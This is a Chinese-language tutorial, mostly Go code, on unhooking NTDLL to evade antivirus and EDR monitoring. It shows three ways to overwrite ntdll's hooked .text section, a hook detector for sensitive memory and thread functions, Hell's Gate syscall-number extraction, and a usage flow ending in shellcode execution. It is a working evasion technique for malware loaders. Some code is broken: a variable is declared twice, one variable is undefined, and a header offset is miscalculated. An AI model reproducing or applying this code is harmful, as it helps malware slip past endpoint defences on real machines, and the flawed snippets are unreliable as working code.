# NTDLL脱钩技术

## 1. NTDLL脱钩原理

**原理：**
- 杀软/EDR会Hook NTDLL的敏感函数（如NtAllocateVirtualMemory）
- 通过修改函数入口字节（jmp指令）实现监控
- 从干净的来源恢复NTDLL代码段
- 绕过用户层Hook直接调用真实syscall

**Hook检测方式：**
- 检查函数入口字节是否为jmp指令（0xE9, 0xEB）
- 正常syscall stub：`mov r10, rcx; mov eax, <SSN>; syscall; ret`

---

## 2. 三种脱钩方式

### 2.1 从磁盘恢复

```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
    "os"
)

// 从磁盘NTDLL恢复代码段
func unhookNtdllFromDisk() error {
    // 1. 获取当前NTDLL基址
    ntdllBase := getModuleHandleByPEB("ntdll.dll")
    if ntdllBase == 0 {
        return syscall.ERROR_MODULE_NOT_FOUND
    }

    // 2. 读取磁盘上的NTDLL
    ntdllPath := "C:\\Windows\\System32\\ntdll.dll"
    data, err := os.ReadFile(ntdllPath)
    if err != nil {
        return err
    }

    // 3. 解析PE结构
    dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&data[0]))
    if dosHeader.E_magic != 0x5A4D {
        return syscall.ERROR_INVALID_IMAGE
    }

    ntHeader := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(&data[dosHeader.E_lfanew]))

    // 4. 获取.text段
    sections := (*[0xFFFF]IMAGE_SECTION_HEADER)(unsafe.Pointer(
        uintptr(unsafe.Pointer(&data[0])) + uintptr(dosHeader.E_lfanew) +
        unsafe.Sizeof(IMAGE_FILE_HEADER{}) + unsafe.Sizeof(IMAGE_OPTIONAL_HEADER64{})))

    for i := uint16(0); i < ntHeader.FileHeader.NumberOfSections; i++ {
        section := sections[i]
        sectionName := cStringToString(uintptr(unsafe.Pointer(&section.Name[0])))

        if sectionName == ".text" {
            // 5. 修改当前NTDLL内存保护
            kernel32 := windows.NewLazySystemDLL("kernel32.dll")
            VirtualProtect := kernel32.NewProc("VirtualProtect")

            var oldProtect uint32
            textAddr := ntdllBase + uintptr(section.VirtualAddress)
            textSize := uintptr(section.Misc.VirtualSize)

            VirtualProtect.Call(textAddr, textSize,
                0x40, // PAGE_EXECUTE_READWRITE
                uintptr(unsafe.Pointer(&oldProtect)))

            // 6. 写入干净的代码
            RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
            RtlMoveMemory.Call(textAddr,
                uintptr(unsafe.Pointer(&data[section.PointerToRawData])),
                uintptr(section.SizeOfRawData))

            // 7. 恢复内存保护
            VirtualProtect.Call(textAddr, textSize,
                uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

            break
        }
    }

    return nil
}

// PEB Walk获取模块基址
func getModuleHandleByPEB(moduleName string) uintptr {
    // 获取PEB地址
    peb := getPEB()
    if peb == 0 {
        return 0
    }

    pebPtr := (*PEB)(unsafe.Pointer(peb))
    ldr := (*PEB_LDR_DATA)(unsafe.Pointer(pebPtr.Ldr))

    // 遍历InLoadOrderModuleList
    head := ldr.InLoadOrderModuleList.Flink
    current := (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(head))

    for {
        name := readUnicodeString(&current.BaseDllName)
        if compareStringsIgnoreCase(name, moduleName) {
            return current.DllBase
        }

        next := current.InLoadOrderLinks.Flink
        if next == uintptr(unsafe.Pointer(&ldr.InLoadOrderModuleList)) {
            break
        }
        current = (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(next))
    }

    return 0
}

// 使用NtQueryInformationProcess获取PEB地址（Go推荐方式）
func getPEB() uintptr {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

    var pbi PROCESS_BASIC_INFORMATION
    var returnLength uint32

    NtQueryInformationProcess.Call(
        uintptr(windows.CurrentProcess()),
        0, // ProcessBasicInformation
        uintptr(unsafe.Pointer(&pbi)),
        uintptr(unsafe.Sizeof(pbi)),
        uintptr(unsafe.Pointer(&returnLength)))

    return uintptr(pbi.PebBaseAddress)
}

type PROCESS_BASIC_INFORMATION struct {
    ExitStatus       uintptr
    PebBaseAddress   uintptr
    AffinityMask     uintptr
    BasePriority     uintptr
    UniqueProcessId  uintptr
    InheritedFromPid uintptr
}

// 注意：在x64 Windows上，PEB地址理论上在GS:[0x60]
// 但Go不直接支持汇编读取GS寄存器
// 使用NtQueryInformationProcess是稳定可靠的替代方案
```

### 2.2 从KnownDlls恢复

```go
// 从KnownDlls Section获取干净NTDLL
func unhookNtdllFromKnownDlls() error {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    ntdllBase := ntdll.FindProc("NtAllocateVirtualMemory").Addr() // 获取基址需要调整

    // 1. 打开KnownDlls Section
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    NtOpenSection := ntdll.NewProc("NtOpenSection")
    NtMapViewOfSection := ntdll.NewProc("NtMapViewOfSection")

    // Section名称
    sectionName := syscall.StringToUTF16Ptr("\\KnownDlls\\ntdll.dll")

    // OBJECT_ATTRIBUTES结构
    var objAttr OBJECT_ATTRIBUTES
    objAttr.Length = uint32(unsafe.Sizeof(objAttr))
    objAttr.ObjectName = uintptr(unsafe.Pointer(sectionName))
    objAttr.Attributes = 0x40 // OBJ_CASE_INSENSITIVE

    // UNICODE_STRING
    us := (*UNICODE_STRING)(unsafe.Pointer(objAttr.ObjectName))
    us.Length = uint16(len("\\KnownDlls\\ntdll.dll") * 2)
    us.MaximumLength = us.Length + 2
    us.Buffer = uintptr(unsafe.Pointer(sectionName))

    var sectionHandle windows.Handle
    status, _, _ := NtOpenSection.Call(
        uintptr(unsafe.Pointer(&sectionHandle)),
        0x000F001F, // SECTION_ALL_ACCESS
        uintptr(unsafe.Pointer(&objAttr)))

    if status != 0 {
        return syscall.ERROR_ACCESS_DENIED
    }

    // 2. 映射Section
    var viewBase uintptr
    var viewSize uintptr = 0

    status, _, _ = NtMapViewOfSection.Call(
        uintptr(sectionHandle),
        uintptr(windows.CurrentProcess()),
        uintptr(unsafe.Pointer(&viewBase)),
        0, 0, uintptr(unsafe.Pointer(&viewSize)),
        0, 0, 0x02, // PAGE_READONLY
        0)

    if status != 0 {
        windows.CloseHandle(sectionHandle)
        return syscall.ERROR_ACCESS_DENIED
    }

    // 3. 复制干净代码到当前NTDLL
    // ... 解析PE并复制.text段

    // 4. 清理
    windows.UnmapViewOfFile(viewBase)
    windows.CloseHandle(sectionHandle)

    return nil
}
```

### 2.3 从挂起进程恢复

```go
// 从挂起进程获取干净NTDLL
func unhookNtdllFromSuspendedProcess() error {
    // 1. 创建挂起进程
    cmdPath := syscall.StringToUTF16Ptr("C:\\Windows\\System32\\cmd.exe")

    var si windows.StartupInfo
    var pi windows.ProcessInformation
    si.Size = uint32(unsafe.Sizeof(si))

    err := windows.CreateProcess(nil, cmdPath, nil, nil, false,
        0x4, // CREATE_SUSPENDED
        nil, nil, &si, &pi)
    if err != nil {
        return err
    }

    // 2. 获取新进程NTDLL基址
    newNtdllBase := getRemoteModuleBase(pi.Process, "ntdll.dll")

    // 3. 获取.text段信息
    // 需要读取新进程的PE结构

    // 4. 读取干净代码
    cleanCode := readRemoteProcessMemory(pi.Process,
        newNtdllBase+textSection.VirtualAddress,
        textSection.SizeOfRawData)

    // 5. 写入当前进程
    currentNtdllBase := getModuleHandleByPEB("ntdll.dll")

    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    var oldProtect uint32
    VirtualProtect.Call(currentNtdllBase+textSection.VirtualAddress,
        uintptr(textSection.SizeOfRawData),
        0x40, uintptr(unsafe.Pointer(&oldProtect)))

    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    RtlMoveMemory.Call(currentNtdllBase+textSection.VirtualAddress,
        uintptr(unsafe.Pointer(&cleanCode[0])),
        uintptr(len(cleanCode)))

    VirtualProtect.Call(currentNtdllBase+textSection.VirtualAddress,
        uintptr(textSection.SizeOfRawData),
        uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

    // 6. 终止挂起进程
    windows.TerminateProcess(pi.Process, 0)
    windows.CloseHandle(pi.Process)
    windows.CloseHandle(pi.Thread)

    return nil
}

// 获取远程进程模块基址
func getRemoteModuleBase(process windows.Handle, moduleName string) uintptr {
    // 使用EnumProcessModulesEx或手动遍历PEB
    // ...
    return 0
}

// 读取远程进程内存
func readRemoteProcessMemory(process windows.Handle, addr uintptr, size uint32) []byte {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")

    buffer := make([]byte, size)
    var bytesRead uint32

    ReadProcessMemory.Call(uintptr(process), addr,
        uintptr(unsafe.Pointer(&buffer[0])),
        uintptr(size), uintptr(unsafe.Pointer(&bytesRead)))

    return buffer
}
```

---

## 3. 检测Hook

```go
// 检测函数是否被Hook
func isFunctionHooked(funcAddr uintptr) bool {
    stub := (*[16]byte)(unsafe.Pointer(funcAddr))

    // 检查jmp指令
    if stub[0] == 0xE9 || stub[0] == 0xEB {
        return true // 被Hook
    }

    // 检查call指令
    if stub[0] == 0xE8 {
        return true // 可能被Hook
    }

    // 检查正常syscall stub
    // mov r10, rcx: 4C 8B D1
    if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 {
        return false // 正常，未Hook
    }

    return true // 其他情况可能被Hook
}

// 检测多个敏感函数是否被Hook
func checkNtdllHooks() []string {
    hookedFuncs := []string{}

    ntdll := windows.NewLazySystemDLL("ntdll.dll")

    sensitiveFuncs := []string{
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtQueueApcThreadEx2",
        "NtOpenProcess",
        "NtOpenThread",
        "NtSuspendThread",
        "NtResumeThread",
        "NtTerminateProcess",
    }

    for _, funcName := range sensitiveFuncs {
        proc := ntdll.NewProc(funcName)
        if isFunctionHooked(proc.Addr()) {
            hookedFuncs = append(hookedFuncs, funcName)
        }
    }

    return hookedFuncs
}
```

---

## 4. 获取SSN（Hell's Gate）

```go
// Hell's Gate：从NTDLL stub提取SSN
func getSSN(funcName string) uint32 {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    proc := ntdll.NewProc(funcName)

    stub := (*[23]byte)(unsafe.Pointer(proc.Addr()))

    // 正常syscall stub结构:
    // 4C 8B D1          mov r10, rcx
    // B8 XX XX XX XX    mov eax, <SSN>
    // 0F 05             syscall
    // C3                ret

    if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 {
        if stub[4] == 0xB8 {
            // 提取SSN
            return uint32(stub[5]) |
                uint32(stub[6])<<8 |
                uint32(stub[7])<<16 |
                uint32(stub[8])<<24
        }
    }

    // 被Hook的情况：需要从干净NTDLL获取
    return getSSNFromCleanNtdll(funcName)
}

// 从干净NTDLL获取SSN
func getSSNFromCleanNtdll(funcName string) uint32 {
    // 1. 先脱钩
    unhookNtdllFromDisk()

    // 2. 重新获取SSN
    return getSSN(funcName)
}
```

---

## 5. 结构定义

```go
type IMAGE_DOS_HEADER struct {
    E_magic    uint16
    E_cblp     uint16
    E_cp       uint16
    E_crlc     uint16
    E_cparhdr  uint16
    E_minalloc uint16
    E_maxalloc uint16
    E_ss       uint16
    E_sp       uint16
    E_csum     uint16
    E_ip       uint16
    E_csc      uint16
    E_lfarlc   uint16
    E_ovno     uint16
    E_res      [4]uint16
    E_oemid    uint16
    E_oeminfo  uint16
    E_res2     [10]uint16
    E_lfanew   int32
}

type IMAGE_NT_HEADERS64 struct {
    Signature      uint32
    FileHeader     IMAGE_FILE_HEADER
    OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_FILE_HEADER struct {
    Machine              uint16
    NumberOfSections     uint16
    TimeDateStamp        uint32
    PointerToSymbolTable uint32
    NumberOfSymbols      uint32
    SizeOfOptionalHeader uint16
    Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER64 struct {
    Magic                       uint16
    MajorLinkerVersion          byte
    MinorLinkerVersion          byte
    SizeOfCode                  uint32
    SizeOfInitializedData       uint32
    SizeOfUninitializedData     uint32
    AddressOfEntryPoint         uint32
    BaseOfCode                  uint32
    ImageBase                   uint64
    SectionAlignment            uint32
    FileAlignment               uint32
    MajorOperatingSystemVersion uint16
    MinorOperatingSystemVersion uint16
    MajorImageVersion           uint16
    MinorImageVersion           uint16
    MajorSubsystemVersion       uint16
    MinorSubsystemVersion       uint16
    Win32VersionValue           uint32
    SizeOfImage                 uint32
    SizeOfHeaders               uint32
    CheckSum                    uint32
    Subsystem                   uint16
    DllCharacteristics          uint16
    SizeOfStackReserve          uint64
    SizeOfStackCommit           uint64
    SizeOfHeapReserve           uint64
    SizeOfHeapCommit            uint64
    LoaderFlags                 uint32
    NumberOfRvaAndSizes         uint32
    DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_SECTION_HEADER struct {
    Name                 [8]byte
    Misc                 struct {
        PhysicalAddress uint32
        VirtualSize     uint32
    }
    VirtualAddress       uint32
    SizeOfRawData        uint32
    PointerToRawData     uint32
    PointerToRelocations uint32
    PointerToLinenumbers uint32
    NumberOfRelocations  uint16
    NumberOfLinenumbers  uint16
    Characteristics      uint32
}

type IMAGE_DATA_DIRECTORY struct {
    VirtualAddress uint32
    Size           uint32
}

type UNICODE_STRING struct {
    Length        uint16
    MaximumLength uint16
    Buffer        uintptr
}

type OBJECT_ATTRIBUTES struct {
    Length                   uint32
    RootDirectory            windows.Handle
    ObjectName               uintptr
    Attributes               uint32
    SecurityDescriptor       uintptr
    SecurityQualityOfService uintptr
}

type PEB struct {
    Reserved1        [2]byte
    BeingDebugged    byte
    Reserved2        [1]byte
    Reserved3        [2]uintptr
    Ldr              uintptr
    ProcessParameters uintptr
}

type PEB_LDR_DATA struct {
    Length                          uint32
    Initialized                     uint32
    SsHandle                        uintptr
    InLoadOrderModuleList           LIST_ENTRY
    InMemoryOrderModuleList         LIST_ENTRY
    InInitializationOrderModuleList LIST_ENTRY
}

type LIST_ENTRY struct {
    Flink uintptr
    Blink uintptr
}

type LDR_DATA_TABLE_ENTRY struct {
    InLoadOrderLinks           LIST_ENTRY
    InMemoryOrderLinks         LIST_ENTRY
    InInitializationOrderLinks LIST_ENTRY
    DllBase                    uintptr
    EntryPoint                 uintptr
    SizeOfImage                uintptr
    FullDllName                UNICODE_STRING
    BaseDllName                UNICODE_STRING
}
```

---

## 6. 使用流程

```go
func main() {
    // 1. 程序启动时检测Hook
    hooked := checkNtdllHooks()
    if len(hooked) > 0 {
        // 发现Hook，需要脱钩
        unhookNtdllFromDisk()
    }

    // 2. 获取SSN（使用Hell's Gate）
    ssn := getSSN("NtAllocateVirtualMemory")

    // 3. 使用直接syscall执行
    addr := directSyscallNtAllocateVirtualMemory(ssn, ...)

    // 4. 继续执行shellcode
}
```

---

## 7. 注意事项

1. **脱钩时机**：程序启动时或执行敏感操作前
2. **权限问题**：需要PAGE_EXECUTE_READWRITE权限写入NTDLL
3. **SSN版本**：不同Windows版本SSN不同，需要动态获取
4. **绕过检测**：脱钩本身可能触发EDR报警，谨慎使用
5. **优先级**：KnownDlls方式比磁盘方式更安全（不触发文件读取）
6. **兼容性**：确保PE结构解析正确